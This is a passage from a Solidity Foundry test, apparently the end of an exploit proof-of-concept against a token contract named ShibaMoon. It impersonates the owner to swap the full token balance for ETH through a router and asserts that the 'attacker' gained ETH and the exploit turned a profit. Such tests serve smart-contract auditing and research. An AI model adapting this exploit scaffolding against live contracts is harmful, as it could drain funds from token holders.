        uint256 tokenBal = IShibaMoon(TARGET).balanceOf(owner);
        if (tokenBal > 0) {
            vm.prank(owner);
            IShibaMoon(TARGET).approve(address(router), tokenBal);

            address[] memory path = new address[](2);
            path[0] = TARGET;
            path[1] = weth;

            vm.prank(owner);
            router.swapExactTokensForETH(
                tokenBal,
                0,
                path,
                owner,
                block.timestamp
            );
        }

        // Verify attacker (owner) ETH balance increased
        uint256 afterETH = owner.balance;
        assertGt(afterETH, beforeETH, "ETH balance should increase");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

